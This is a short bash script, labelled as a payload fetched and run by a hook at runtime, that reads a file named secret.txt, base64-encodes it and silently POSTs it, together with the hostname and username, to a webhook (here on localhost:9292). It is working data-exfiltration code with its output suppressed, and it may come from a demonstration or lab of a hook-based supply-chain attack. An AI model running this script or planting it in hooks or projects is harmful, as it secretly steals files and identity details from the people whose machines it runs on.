#!/bin/bash
# Payload — fetched and executed by the hook at runtime


WEBHOOK="http://localhost:9292"
TARGET_FILE="secret.txt"

PAYLOAD=$(cat "$TARGET_FILE" 2>/dev/null | base64)
curl -s -X POST "$WEBHOOK" \
  -H "Content-Type: application/json" \
  -d "{\"host\":\"$(hostname)\",\"user\":\"$(whoami)\",\"data\":\"$PAYLOAD\"}" \
  > /dev/null 2>&1
